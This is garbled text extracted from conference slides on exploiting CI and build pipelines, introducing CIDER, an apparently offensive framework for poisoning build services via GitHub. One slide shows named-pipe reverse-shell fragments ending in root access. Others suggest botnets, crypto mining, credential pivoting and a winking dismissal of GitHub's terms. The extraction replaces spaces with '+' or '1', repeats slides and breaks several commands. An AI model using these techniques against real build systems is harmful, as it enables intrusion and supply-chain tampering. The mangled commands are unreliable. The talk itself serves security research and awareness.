Exploiting Continuous 
Integration (CI) and 
Automated Build Systems
And introducing CIDER
Whoami
• SpaceB0x
• Sr.+Security+Engineer+at+LeanKit
• Application+and+network+security+(offense+and+defense)
• I+like+breaking+in+to+systems,+building+systems,+and+learning
• Security+consultant
./agenda.sh
• Overview+of+Continuous+Integration+concepts
• Tools+
• Build+Chain+and+Configuration+problems
• Real+world+exploit+#1+
• Common+deployment+bad-practices
• Real+world+exploit+#2+– Attacking+the+CI+provider
• Introduce+CIDER
Continuous1Integration1
Continuous1Integration1(CI)
• Quick+iterative+release+of+code+to+production+servers
• Goal:+Many+deployment+iterations+per+day+or+week
• Tend+to+be+repository+centric
• In+sync+with+Automated+Build+chains
• For+infrastructure/servers/subnets+as+well+as+code+
Microservices
• Just+abstraction
• Breaking+down+large+app+into+small+decoupled+components
• Do+1+or+2+things+really+well
• Developed+Autonomously+
Security1Implications
• Good+- Frequent+release+cycles+are+fabulous!
• Good+- Faster+code+deployments+=+quick+remediation
• Good+– Reduced+single+points+of+failure
• Good+- Compromise+of+one+service+doesn’t+(always)+mean+full+pwnage
Security1Implications
• Good+- Frequent+release+cycles+are+fabulous!
• Good+- Faster+code+deployments+=+quick+remediation
• Good+- Decoupled+systems+reduced+single+points+of+failure
• Good+- Compromise+of+one+service+doesn’t+(always)+mean+full+pwnage
• Bad+- Fast+release+sometimes+means+hasty+oversights
• Bad+- Automated+Deployment+systems+are+checked+less+than+the+code+
that+they+deploy+
• Bad+– Identity+management
Tools
Build1Systems
• Take+code+and+build+conditionally
• Typically+in+a+quasi+containerized+type+of+environment
• Both+local+and+cloud+based+are+popular
• Vendor:
ØTravis-CI
ØCircle-CI
ØDrone
ØTeamCity
ØBuildKite
Build1Systems
• Take+code+and+build+conditionally
• Typically+in+a+quasi+containerized+type+of+environment
• Both+local+and+cloud+based+are+popular
• Vendor:
ØTravis-CI
ØCircle-CI
ØDrone
ØTeamCity
ØBuildKite
Deployment1Systems
• Deploy+the+code+after+build
• Heading+more+and+more+toward+container+driven
• Vendors
ØJenkins
ØOctopus+Deploy
ØKubernetes
ØRancher
ØMesosphere
Chains1of1Deployment
Chains1of1Deployment
Chains1of
deployment
Configuration1Exposure
Problems1with1SDLC1trends
• Code+build+before+merging
• Builds+triggered+from+PRs,+commits,+etc.
• Repos+hold+downstream+instructions
• Build+configurations+normally+in+root+of+repo
Vulnerabilities1are1in1Misconfiguration
• Creative+configuration+exploitation
• Vuln stacking+at+it’s+finest
• Each+individual+service+may+be+functioning+exactly+as+intended
• Interaction+between+services+is+where+many+vulnerabilities+lie
External1Repos
• Most+volatile+attack+surface
• Public+repositories+which+map+to+internal+build+services
Attacking1Build1Servers- 31main1ways
• Pre/Post+Commands
• Image+Specification
• Test+builds
Real1World1Hax #1
mknod /tmp/backpipe p
mknod /tmp/backpipe p
/bin/sh 0/tmp/backpipe
mknod /tmp/backpipe p
/bin/sh 0/tmp/backpipe
nc –l 4444
root
So1many1questions….
•Who+is+aware+of+this?
•What+are+the+implications?
•Attack+surface?
Existing1pwnage
• @claudijd and+RottenApple
• Framework+for+exploiting+CI+(Jenkins)+via+Ruby+code+builds
• Audit+framework,+as+well+as+attack+surface
•
•
I’ll+keep+poking+around
Who1Cares?
• Cloud+Based
• Clog+up+deployment+chain+by+filling+build+queues
• Cloud+Based
• Clog+up+deployment+chain+by+filling+build+queues
• Build+Bot-Net+and+launch+DoS?+Yes+please?
• Cloud+Based
• Clog+up+deployment+chain+by+filling+build+queues
• Build+Bot-Net+and+launch+DoS?+Yes+please?
• Mine+Etherium lulz
• Cloud+Based
• Clog+up+deployment+chain+by+filling+build+queues
• Build+Bot-Net+and+launch+DoS?+Yes+please+?
• Mine+Etherium lulz
• On-Prem/Self-Hosted
• Take+over+a+network
• Cloud+Based
• Clog+up+deployment+chain+by+filling+build+queues
• Build+Bot-Net+and+launch+DoS?+Yes+please+?
• Mine+Etherium lulz
• On-Prem/Self-Hosted
• Take+over+a+network
• Alter+source+repositories
• Cloud+Based
• Clog+up+deployment+chain+by+filling+build+queues
• Build+Bot-Net+and+launch+DoS?+Yes+please+?
• Mine+Etherium lulz
• On-Prem/Self-Hosted
• Take+over+a+network
• Alter+source+repositories
• Alter+downstream+production+deployments
Bad-Practices1for1Hosted1Services
Environment1Vars
• Being+used+to+store+credentials
• Storing+metadata+for+other+services+within+micro-service+
infrastructure
• THIS+IS+HOW+WE+PIVOT
Run1everything1as1root
• Just+a+container,+right+guyz?
• You+now+have+internal+network+access
• Full+control+to+build+augment+the+image
Real1World1Hax #2
GCLOUD
sudo gloud compute+project-info+describe
sudo gcloud compute+networks+create+testnetwork –mode+auto
Introducing1CIDER
What1is1CIDER?
•Continuous+Integration+and+Deployment+ExploiteR
What1is1CIDER?
•Continuous+Integration+and+Deployment+ExploiteR
• Framework+for+exploiting+and+attacking+CI+build+chains
What1is1CIDER?
•Continuous+Integration+and+Deployment+ExploiteR
• Framework+for+exploiting+and+attacking+CI+build+chains
• Mainly+leverages+GitHub+as+attack+surface+to+get+to+build+services
What1is1CIDER?
•Continuous+Integration+and+Deployment+ExploiteR
• Framework+for+exploiting+and+attacking+CI+build+chains
• Mainly+leverages+GitHub+as+attack+surface+to+get+to+build+services
• Takes+the+mess+out+forking,+PR-ing,+callbacking
What1is1CIDER?
•Continuous+Integration+and+Deployment+ExploiteR
• Framework+for+exploiting+and+attacking+CI+build+chains
• Mainly+leverages+GitHub+as+attack+surface+to+get+to+build+services
• Takes+the+mess+out+forking,+PR-ing,+callbacking
• It+will+poison+a+handful+of+build+services+and+”exploits”+for+each+one
Why1CIDER?
• Fun
• Make+attacking+easy
• Awareness
• RottenApple by+@claudijd
• Facilitate+further+research
CIDER1overview
CIDER1– ‘help’
CIDER1– ‘add1target’1&1‘list1targets’
CIDER1– ‘load’1and1‘info’
CIDER1features
• Node.JS
• Build+modularly
• Can+handle+bulk+lists+of+target+repos
• Clean+up+for+GitHub+repo+craziness
• Ngrok – because+port+forwarding+and+public+IPs+suck
Ngrok
Disclaimer
• It+is+against+the+GitHub+user+agreement+to+test+against+a+repository,+
even+if+you+have+permission+from+the+owner+of+the+repo
• You+must+be+the+owner+to+test+a+repo
• When+testing+ask+them+to+make+you+an+owner
WINK+WINK
DEMO
Limitations
• Build+Queues
• GitHub+Noise
• Timeouts
• Repo+API+request+throttling
Just1the1beginning…
• More+CI-Frameworks
• Start+tackling+deployment+services
• Start+exploring+other+entrypoints
• Other+code+repositories
• ChatOps (Slack)
Thanks
• LeanKit+Operations+Team
• Evan+Snapp
• @claudijd
• Wife++
Fin
CIDER+on+Github:
https://github.com/spaceB0x/cider
Twitter:+@spaceB0xx
www.untamedtheory.com